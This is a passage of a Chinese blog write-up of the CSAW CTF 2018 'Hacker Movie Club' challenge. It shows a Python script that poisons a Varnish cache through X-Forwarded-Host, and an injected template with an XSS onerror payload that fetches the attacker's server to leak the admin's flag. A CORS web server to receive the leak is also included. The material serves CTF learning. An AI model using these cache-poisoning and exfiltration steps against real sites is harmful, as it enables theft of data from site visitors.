class="line">        <span class="built_in">document</span>.head.appendChild(s);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit</code>内容为下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* PLEASE DO NOT COPY AND PASTE THIS CODE. */</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> CFG = <span class="string">'___grecaptcha_cfg'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">window</span>[CFG]) &#123;</span><br><span class="line">        <span class="built_in">window</span>[CFG] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> GR = <span class="string">'grecaptcha'</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">window</span>[GR]) &#123;</span><br><span class="line">        <span class="built_in">window</span>[GR] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">window</span>[GR].ready = <span class="built_in">window</span>[GR].ready ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123; (<span class="built_in">window</span>[CFG][<span class="string">'fns'</span>] = <span class="built_in">window</span>[CFG][<span class="string">'fns'</span>] || []).push(f);</span><br><span class="line">    &#125;; (<span class="built_in">window</span>[CFG][<span class="string">'render'</span>] = <span class="built_in">window</span>[CFG][<span class="string">'render'</span>] || []).push(<span class="string">'explicit'</span>); (<span class="built_in">window</span>[CFG][<span class="string">'onload'</span>] = <span class="built_in">window</span>[CFG][<span class="string">'onload'</span>] || []).push(<span class="string">'loaded_recapcha'</span>);</span><br><span class="line">    <span class="built_in">window</span>[<span class="string">'__google_recaptcha_client'</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">var</span> po = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    po.type = <span class="string">'text/javascript'</span>;</span><br><span class="line">    po.async = <span class="literal">true</span>;</span><br><span class="line">    po.src = <span class="string">'https://www.gstatic.com/recaptcha/api2/v1536705955372/recaptcha__zh_cn.js'</span>;</span><br><span class="line">    <span class="keyword">var</span> elem = <span class="built_in">document</span>.querySelector(<span class="string">'script[nonce]'</span>);</span><br><span class="line">    <span class="keyword">var</span> n = elem &amp;&amp; (elem[<span class="string">'nonce'</span>] || elem.getAttribute(<span class="string">'nonce'</span>));</span><br><span class="line">    <span class="keyword">if</span> (n) &#123;</span><br><span class="line">        po.setAttribute(<span class="string">'nonce'</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'script'</span>)[<span class="number">0</span>];</span><br><span class="line">    s.parentNode.insertBefore(po, s);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>除此之外，还发现了个<code>Report an issue</code>的功能</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537343210855.png" alt="1537343210855"></p>
+<p>除此之外，还有这两个<code>js</code>，以下为<code>add.js</code>的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script data-src=&quot;app.js&quot; data-cdn=&quot;6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>内容为</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([</span><br><span class="line">    fetch(<span class="string">'/api/movies'</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.json()),</span><br><span class="line">    fetch(<span class="string">`//6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services/cdn/main.mst`</span>).then(<span class="function"><span class="params">r</span>=&gt;</span>r.text()),</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.loaded_recapcha === <span class="literal">true</span>)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        <span class="built_in">window</span>.loaded_recapcha = resolve;</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.loaded_mustache === <span class="literal">true</span>)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        <span class="built_in">window</span>.loaded_mustache = resolve;</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(<span class="function">(<span class="params">[user, view]</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'content'</span>).innerHTML = Mustache.render(view,user);</span><br><span class="line"></span><br><span class="line">    grecaptcha.render(<span class="built_in">document</span>.getElementById(<span class="string">"captcha"</span>), &#123;</span><br><span class="line">        sitekey: <span class="string">'6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5'</span>,</span><br><span class="line">        theme: <span class="string">'dark'</span>,</span><br><span class="line">        callback: <span class="function"><span class="params">t</span>=&gt;</span> &#123;</span><br><span class="line">            token = t;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).disabled = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> hidden = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).onclick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hidden) &#123;</span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">"captcha"</span>).parentElement.style.display=<span class="string">'block'</span>;</span><br><span class="line">          <span class="built_in">document</span>.getElementById(<span class="string">'report'</span>).disabled = <span class="literal">true</span>;</span><br><span class="line">          hidden = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fetch(<span class="string">'/api/report'</span>,&#123;</span><br><span class="line">            method: <span class="string">'POST'</span>,</span><br><span class="line">            body: <span class="built_in">JSON</span>.stringify(&#123;<span class="attr">token</span>:token&#125;)</span><br><span class="line">        &#125;).then(<span class="function"><span class="params">r</span>=&gt;</span>r.json()).then(<span class="function"><span class="params">j</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (j.success) &#123;</span><br><span class="line">                <span class="comment">// The admin is on her way to check the page</span></span><br><span class="line">                alert(<span class="string">"Neo... nobody has ever done this before."</span>);</span><br><span class="line">                alert(<span class="string">"That's why it's going to work."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                alert(<span class="string">"Dodge this."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>其中还有<code>6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services/cdn/main.mst</code>，下载看看，内容为下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span></span><br><span class="line">Hacker Movie Club</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;#admin&#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header admin"</span>&gt;</span></span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;&#123;/admin&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"movies"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Year<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Length<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">  &#123;&#123;^admin_only&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; year &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; length &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  &#123;&#123;/admin_only&#125;&#125;</span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"captcha"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"captcha"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"report"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"report"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上诉这些，其实都可以通过开发者工具一览究竟</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537345852973.png" alt="1537345852973"></p>
+<p>在其中的<code>/api/report</code>发现了一些有趣的东西</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537346702605.png" alt="1537346702605"></p>
+<p>回显如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;admin&quot;:false,&quot;movies&quot;:[&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 54 Minutes&quot;,&quot;name&quot;:&quot;WarGames&quot;,&quot;year&quot;:1983&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;0 Hours, 31 Minutes&quot;,&quot;name&quot;:&quot;Kung Fury&quot;,&quot;year&quot;:2015&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 6 Minutes&quot;,&quot;name&quot;:&quot;Sneakers&quot;,&quot;year&quot;:1992&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 39 Minutes&quot;,&quot;name&quot;:&quot;Swordfish&quot;,&quot;year&quot;:2001&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 6 Minutes&quot;,&quot;name&quot;:&quot;The Karate Kid&quot;,&quot;year&quot;:1984&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 23 Minutes&quot;,&quot;name&quot;:&quot;Ghost in the Shell&quot;,&quot;year&quot;:1995&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;5 Hours, 16 Minutes&quot;,&quot;name&quot;:&quot;Serial Experiments Lain&quot;,&quot;year&quot;:1998&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 16 Minutes&quot;,&quot;name&quot;:&quot;The Matrix&quot;,&quot;year&quot;:1999&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 57 Minutes&quot;,&quot;name&quot;:&quot;Blade Runner&quot;,&quot;year&quot;:1982&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 43 Minutes&quot;,&quot;name&quot;:&quot;Blade Runner 2049&quot;,&quot;year&quot;:2017&#125;,</span><br><span class="line">&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 47 Minutes&quot;,&quot;name&quot;:&quot;Hackers&quot;,&quot;year&quot;:1995&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;1 Hour, 36 Minutes&quot;,&quot;name&quot;:&quot;TRON&quot;,&quot;year&quot;:1982&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 5 Minutes&quot;,&quot;name&quot;:&quot;Tron: Legacy&quot;,&quot;year&quot;:2010&#125;,&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 25 Minutes&quot;,&quot;name&quot;:&quot;Minority Report&quot;,&quot;year&quot;:2002&#125;,</span><br><span class="line">&#123;&quot;admin_only&quot;:false,&quot;length&quot;:&quot;2 Hours, 37 Minutes&quot;,&quot;name&quot;:&quot;eXistenZ&quot;,&quot;year&quot;:1999&#125;,&#123;&quot;admin_only&quot;:true,&quot;length&quot;:&quot;22 Hours, 17 Minutes&quot;,&quot;name&quot;:&quot;[REDACTED]&quot;,&quot;year&quot;:2018&#125;]&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到最后一句<code>{&quot;admin_only&quot;:true,&quot;length&quot;:&quot;22 Hours, 17 Minutes&quot;,&quot;name&quot;:&quot;[REDACTED]&quot;,&quot;year&quot;:2018}]}</code>与之前的不同，猜测着里如果将<code>true</code>改成<code>flase</code>，那么<code>[REDACTED]</code>将是可见的，但是好像没用啊。做题的时候，也就只做到这里，后面看了大佬们的<code>writeup</code>才理解过来。</p>
+<p>仔细查看每个响应头都有：<code>Via: 1.1 varnish-v4</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537346973458.png" alt="1537346973458"></p>
+<p>额，，下面直接引用大佬的<a href="https://delcoding.github.io/2018/09/csaw-writeup2/" target="_blank" rel="noopener">writeup</a>。</p>
+<p>了解了下<code>varnish</code>，发现它是一个<code>反向代理</code>中的<code>缓存服务</code>程序。</p>
+<blockquote>
+<p>如果来自Apache的响应是可缓存的，Varnish会将其存储以便更快地响应未来的请求。</p>
+</blockquote>
+<p>  varnish详细的请求头可以在<a href="https://docs.acquia.com/acquia-cloud/performance/varnish/" target="_blank" rel="noopener">这里</a>找到。</p>
+<p>  所以这里我们需要用到一种叫<code>Web Cache Poisoning</code>（<code>web缓存污染</code>）的利用方法，这个跟<code>Cache Poisoning</code>（又称DNS污染）是不一样的东西。</p>
+<p>  参考链接：</p>
+<p>  <a href="https://xz.aliyun.com/t/2585" target="_blank" rel="noopener">中文版-实战Web缓存中毒</a></p>
+<p>  <a href="https://portswigger.net/blog/practical-web-cache-poisoning" target="_blank" rel="noopener">英文原版</a></p>
+<p>  这里我们可以重点关注<code>DOM Poisoning</code>（DOM污染）。</p>
+<p>  另一个需要先了解的事情是<code>X-Forwarded-Host</code>的作用，详情可参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-Host" target="_blank" rel="noopener">这里</a>。</p>
+<blockquote>
+<p>X-Forwarded-Host (XFH) 是一个事实上的标准首部，用来确定客户端发起的请求中使用 Host 指定的初始域名。 反向代理（如负载均衡服务器、CDN等）的域名或端口号可能会与处理请求的源头服务器有所不同，在这种情况下，X-Forwarded-Host 可以用来确定哪一个域名是最初被用来访问的。</p>
+</blockquote>
+<p>  语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Host: &lt;host&gt;</span><br></pre></td></tr></table></figure>
+<p>  上面这些归结起来就是<code>当服务器进行缓存时它会将客户端的请求转发到XFH指定的host上去。</code></p>
+<p>  现在再回过头看看我们已有的资料。我们得知<code>main.mst</code>是模板文件，它会利用<code></code>等对admin身份进行判断，如果我们能够劫持掉这个模板文件，使她绕过admin就可以获得到完整的项。</p>
+<p>  我们先来找到<code>main.mst</code>缓存的最大时间(<code>max-age</code>)，我们可以带着<code>X-Forwarded-Host</code>不停的请求<code>/cdn/app.js</code>，如果<code>fetch(&#39;//4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/main.mst&#39;)</code>能被我们控制到<code>fetch(&#39;my_server/cdn/main.mst&#39;)</code>上就成功的完成了劫持。</p>
+<p>  我们可以使用下面的脚本验证一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">X_Forwarded_Host = &apos;1.2.3.4&apos; </span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    resp = requests.get(&quot;http://4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/app.js&quot;, headers=&#123;&apos;X-Forwarded-Host&apos;: X_Forwarded_Host&#125;)</span><br><span class="line">    print resp.headers</span><br><span class="line">    if X_Forwarded_Host in resp.text:</span><br><span class="line">        print resp.text</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537351113421.png" alt="1537351113421"></p>
+<p>得到的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">var token = null;</span><br><span class="line"></span><br><span class="line">Promise.all([</span><br><span class="line">    fetch('/api/movies').then(r=&gt;r.json()),</span><br><span class="line">    fetch(`//1.2.3.4/cdn/main.mst`).then(r=&gt;r.text()),</span><br><span class="line">    new Promise((resolve) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (window.loaded_recapcha === true)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        window.loaded_recapcha = resolve;</span><br><span class="line">    &#125;),</span><br><span class="line">    new Promise((resolve) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (window.loaded_mustache === true)</span><br><span class="line">            <span class="keyword">return</span> resolve();</span><br><span class="line">        window.loaded_mustache = resolve;</span><br><span class="line">    &#125;)</span><br><span class="line">]).then(([user, view])=&gt;&#123;</span><br><span class="line">    document.getElementById(<span class="string">'content'</span>).innerHTML = Mustache.render(view,user);</span><br><span class="line"></span><br><span class="line">    grecaptcha.render(document.getElementById(<span class="string">"captcha"</span>), &#123;</span><br><span class="line">        sitekey: <span class="string">'6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5'</span>,</span><br><span class="line">        theme: <span class="string">'dark'</span>,</span><br><span class="line">        callback: t=&gt; &#123;</span><br><span class="line">            token = t;</span><br><span class="line">            document.getElementById(<span class="string">'report'</span>).disabled = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    let hidden = true;</span><br><span class="line">    document.getElementById('report').onclick = () =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (hidden) &#123;</span><br><span class="line">          document.getElementById(<span class="string">"captcha"</span>).parentElement.style.display=<span class="string">'block'</span>;</span><br><span class="line">          document.getElementById(<span class="string">'report'</span>).disabled = true;</span><br><span class="line">          hidden = false;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fetch(<span class="string">'/api/report'</span>,&#123;</span><br><span class="line">            method: <span class="string">'POST'</span>,</span><br><span class="line">            body: JSON.stringify(&#123;token:token&#125;)</span><br><span class="line">        &#125;).then(r=&gt;r.json()).then(j=&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span> (j.success) &#123;</span><br><span class="line">                // The admin <span class="keyword">is</span> on her way to check the page</span><br><span class="line">                alert(<span class="string">"Neo... nobody has ever done this before."</span>);</span><br><span class="line">                alert(<span class="string">"That's why it's going to work."</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                alert(<span class="string">"Dodge this."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>em~</p>
+<p>然后通过<code>web缓存污染</code>劫持了模板文件。接着我们再构造好模板文件，然后让<code>admin</code>去访问就可以拿到<code>flag</code>了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;header&quot;&gt;</span><br><span class="line">Hacker Movie Club</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;header admin&quot;&gt;</span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;table class=&quot;movies&quot;&gt;</span><br><span class="line">&lt;thead&gt;</span><br><span class="line"> &lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;th&gt;Length&lt;/th&gt;</span><br><span class="line">&lt;/thead&gt;</span><br><span class="line">&lt;tbody&gt;</span><br><span class="line"></span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;/tbody&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;captcha&quot;&gt;</span><br><span class="line">  &lt;div id=&quot;captcha&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;report&quot; type=&quot;submit&quot; class=&quot;report&quot;&gt;&lt;/button&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;fetch(&apos;http://my_server_ip/&apos;+&apos;&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>它要求服务器回应的头信息要包含<code>Access-Control-Allow-Origin</code>字段，如果你不想配置Apache或者Nginx，那你可以使用下面这个建议的python web server。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    # Python 3</span><br><span class="line">    <span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, SimpleHTTPRequestHandler, test <span class="keyword">as</span> test_orig</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    def test (*args):</span><br><span class="line">        test_orig(*args, port=int(sys.argv[<span class="number">1</span>]) <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">8000</span>)</span><br><span class="line">except ImportError: # Python 2</span><br><span class="line">    <span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> HTTPServer, test</span><br><span class="line">    <span class="keyword">from</span> SimpleHTTPServer <span class="keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">class CORSRequestHandler (SimpleHTTPRequestHandler):</span><br><span class="line">    def end_headers (self):</span><br><span class="line">        self.send_header(<span class="string">'Access-Control-Allow-Origin'</span>, <span class="string">'*'</span>)</span><br><span class="line">        SimpleHTTPRequestHandler.end_headers(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test(CORSRequestHandler, HTTPServer)</span><br></pre></td></tr></table></figure>
+<p>开启后就能在日志输出中得到<code>flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es}</code></p>
